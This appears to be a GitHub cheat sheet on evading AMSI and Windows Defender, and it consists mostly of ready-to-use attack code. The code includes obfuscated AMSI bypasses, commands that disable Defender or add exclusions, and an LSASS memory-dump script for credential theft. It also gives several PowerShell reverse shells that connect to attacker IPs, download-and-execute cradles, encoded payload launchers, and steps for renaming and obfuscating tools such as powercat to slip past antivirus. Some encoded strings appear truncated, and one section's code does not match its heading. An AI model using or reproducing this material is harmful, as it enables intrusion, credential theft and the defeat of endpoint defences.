#JustEvadeBro

![](Data-Security.gif)

JustEvadeBro, a cheat sheet which will aid you through AMSI evasion.

(Inspired by https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

Please be aware that some of these methods may not be good for OPSEC. I will add a OPSEC method to each section in the future.

Feel free to submit a Pull Request & leave a star to share some love if this helped you. 💖

Yes, we are open to Pull Requests for Hacktoberfest! Please ensure its not spam and actually contributes well to this repo. Thanks & happy hacking!

Credit Info: I have obtained a lot of this info through other Github repos, blogs, sites and more. I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz

# Obfuscation Tools:
Currently maintained:
- https://github.com/obfuscar/obfuscar
- https://github.com/mgeeky/ProtectMyTooling
- https://github.com/h4wkst3r/InvisibilityCloak

Curently not really maintained:
- https://github.com/phra/PEzor
- https://github.com/CBHue/PyFuscation
- https://github.com/danielbohannon/Invoke-Obfuscation
- https://github.com/icyguider/Shhhloader
- https://github.com/C-Sto/BananaPhone
- https://github.com/postrequest/xeca
- https://github.com/bats3c/darkarmour
- https://github.com/loadenmb/tvasion
- https://github.com/mkaring/ConfuserEx
- https://github.com/optiv/ScareCrow

# Easiest way to evading Defender (Requires elevation)

Turning off Windows Defender:
```Set-MpPreference -DisableRealtimeMonitoring $true```

# Another easy way to evade Defender (Requires elevation)

Adding a folder exclusion
```Add-MpPreference -ExclusionPath "C:\temp"```

Checking exclusions
```
Get-MpPreference | Select-Object -Property ExclusionPath

ExclusionPath
-------------
{C:\temp}
```

# Check All Windows Defender Definitions
- https://www.microsoft.com/en-us/wdsi/definitions/antimalware-definition-release-notes

# AMSI bypasses (working as of 17/01/2022)

Multi-line bypass:
```
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)
```
Credit: unknown as of yet.

```
$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).
    substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
```
Credit:
@TihanyiNorbert (Based on the original work of Matt Graeber @mattifestation script)

**If patched, just change up the strings/variables.**

Single-line bypasses:
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
Credit: https://buaq.net/go-98295.html

```
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```
Credit: https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification (however, I think it's originally from Matt Graeber)

```
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
```
Credit: https://www.trendmicro.com/en_us/research/22/l/detecting-windows-amsi-bypass-techniques.html

# Downloader execution based on system architecture

```
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
```
Credit: https://www.trendmicro.com/en_us/research/22/l/detecting-windows-amsi-bypass-techniques.html

# LSASS dumping without triggering Defender
```
$S = "C:\temp"
$P = (Get-Process lsass)
$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
$C = [Reflection.BindingFlags] 'NonPublic, Static'
$D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
$PF = "$($P.Name)_$($P.Id).dmp"
$PDP = Join-Path $S $PF
$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$F.Close()
```
Credit:
@TihanyiNorbert (Full-memory lsass dump based on the original work of Matthew Graeber - @mattifestation)

# Reverse Shells

```
Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($args[0],$args[1]);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2  = $I + (pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()
```
Credit:
@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)

```
$J = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
$SS = $J.GetStream();
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
$SS.Write($OO,0,$OO.Length)
$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
$SS.Write($OO,0,$OO.Length)
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
$GG = (i`eX $DD 2>&1 | Out-String );
$H  = $GG + (pwd).Path + '> ';
$L = ([text.encoding]::UTF8).GetBytes($H);
$SS.Write($L,0,$L.Length);
$SS.Flush()};
$J.Close()
```
Credit:
@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)

```
$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
$I = $c.GetStream();
[byte[]]$U = 0..(2-shl15)|%{0};
$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
$I.Write($U,0,$U.Length)
$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$I.Write($U,0,$U.Length)
while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
$a = (iex $D 2>&1 | Out-String );
$r  = $a + (pwd).Path + '> ';
$m = ([text.encoding]::ASCII).GetBytes($r);
$I.Write($m,0,$m.Length);
$I.Flush()};
$c.Close()
```
Credit: @TihanyiNorbert (Based on the original nishang Framework written by @nikhil_mitt)

# Misc things:

WebClient DownloadData http://x.x.x.x/file.exe method:

```
$bytes = (new-object net.webclient).downloaddata("http://10.10.16.74:8080/payload.exe")
[System.Reflection.Assembly]::Load($bytes)
$BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"
$main = [Shell].getmethod("Main", $BindingFlags)
$main.Invoke($null, $null)
```
Reverse PowerShell:

```
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.5', 4445);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
        $writer.Write("PS> ");
        $writer.Flush();
        $read = $null;
        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $writer.Write($sendbyte,0,$sendbyte.Length);
}While ($true);
$writer.close();$socket.close();
```

Tools that may help with AV Evasion: 
- https://github.com/phra/PEzor
- https://github.com/bats3c/darkarmour
- https://github.com/loadenmb/tvasion

# AMSI.Fail

```https://amsi-fail.azurewebsites.net/api/Generate```

```https://amsi-fail.azurewebsites.net/api/GenerateEnc```

```
iex(new-object net.webclient).downloadstring('https://amsi-fail.azurewebsites.net/api/Generate')
iex(new-object net.webclient).downloadstring('https://bla.com/evil.ps1')
```

# Encoding to bypass:

`cat rev.ps1`

```
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.2', 4444);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
        $writer.Write("PS $(pwd)> ");
        $writer.Flush();
        $read = $null;
        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $writer.Write($sendbyte,0,$sendbyte.Length);
}While ($true);
$writer.close();$socket.close();
```


`echo -n "iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')" | iconv -t 
utf-16le | base64 -w0`
```
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHIAZQB2AC4AcABzADEAJwApAA==
```

`
./exploit.sh -c 'cmd.exe /c powershell -enc aQBlAHgAIAAoAE4AZwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHIAZQB2AC4AcABzADEAJwApAA=='
`

```
 python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.10 - - [04/Oct/2020 14:15:10] "GET /rev.ps1 HTTP/1.1" 200 -
```

```
rlwrap nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.10 63157
PS C:\Windows\System32> 
```

# Turning Powercat into Papacat!

```
sed -i s/powercat/papacat/g powercat.ps1
mv powercat papacat.ps1
vim papacat.ps1
```
Ensure you add `papacat -c 10.10.10.10 -e cmd.exe -p 4444` at the end of papcat

`echo -n 'iex (New-Object Net.WebClient).DownloadString("http://10.10.10.10/papacat.ps1")' | iconv -t utf-16le | base64 -w0`

```
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0
```

```
./exploit.sh -c 'powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAHAAYQBwAGEAYwBhAHQALgBwAHMAMQAiACkA'
```

```
rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.10.10 14134
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```
# Papacatv2
Taken from: https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells
```powershell
PS C:\users\User\Desktop> papacat -l -p 443 -v
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
```
Extra features I performed to ensure (basic) AV evasion is done right:
- renamed every mention of 'powercat' to 'papacat' in the file
- renamed the file from 'powercat.ps1' to 'papacat.ps1'
- removed the help output from '$Help'

These steps may not be necessary to evade AV. 

Note: This is not a fully undetected bypass. As of 24/11/2021 @ 9:35 AM this works against Windows Defender (Security intelligence version 1.353.1502.0), but may not work against other AV. For detections see the links below:
- https://www.virustotal.com/gui/file/8b69e249de782f1a0a082641eade27166fcbaea55fed73576ddd205c5c998e36?nocache=1
- https://virusscan.jotti.org/en-US/filescanjob/m807xvtcky

# PEzor!
```
git clone https://github.com/phra/PEzor.git
cd PEzor
sudo bash install.sh
bash PEzor.sh -h
export PATH=$PATH:~/go/bin/:/opt/PEzor:/opt/PEzor/deps/donut/:/opt/PEzor/deps/wclang/_prefix_PEzor_/bin/
bash PEzor.sh -unhook -antidebug -text -self -sleep=120 binary.exe -z 2
```
# A method that bypassed Defender on an engagement at work (Sometime 2020) [Confirm if it still works]

0. Download and add `procat -c x.x.x.x-p 4444 -e cmd.exe` to the bottom of `procat.ps1`.

1. Execute: `echo -n 'iex (New-Object Net.WebClient).DownloadString("http://x.x.x.x/procat.ps1")' | iconv -t utf-16le | base64 -w0` on the attacking machine.

2. Execute a Python server on the attacking machine:
```python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

3. Execute the PowerShell command on the attacking machine: `powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAABAcwAxACIAKQA=`.

4. Run a `netcat` listener on the attacking machine: `nc -nlvp 4444`.

5. Execute the PowerShell command on the attacking machine: `powershell.exe -a '-NoProfile -Command powershell.exe -EncodedCommand JABzAG8AYwBrAGUAdAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0bwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACcANQAyAC4ANgAzAC4AMQA4AC4AMQA4ACcALAAgADQANAA0ADQAKQA7AAoAaQBmACgAJABzAG8AYwBrAGUAdAAgAC0AZQBxACAAJABuAHUAbABsACkAewBlAHgAaQB0ACAAMQB9AAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAHMAbwBjAGsAZQB0AC40AHIAZQBhAG0AKAApADsACgAkAHc'`

6. If lucky, you may get a shell.

# Getting go binaries past Defender!
Inspiration: https://twitter.com/snovvcrash/status/1540395267064741890?lang=en

I ran the below commands on Windows, (using git & golang) however, the above Tweet shows that its definitely possible in Kali.

The commands used to create a Garble version of Chisel are as below:
```
go install mvdan.cc/garble@latest
git clone https://github.com/jpillora/chisel.git
cd chisel
garble -tiny -literals -seed=random build main.go
```
No detections against Windows Defender as of 30/03/2023: https://antiscan.me/scan/new/result?id=MlpqAEXx9ohJ
(I had to use `upx` to get the binary smaller than 10mb as that is the limit for antiscan.me)
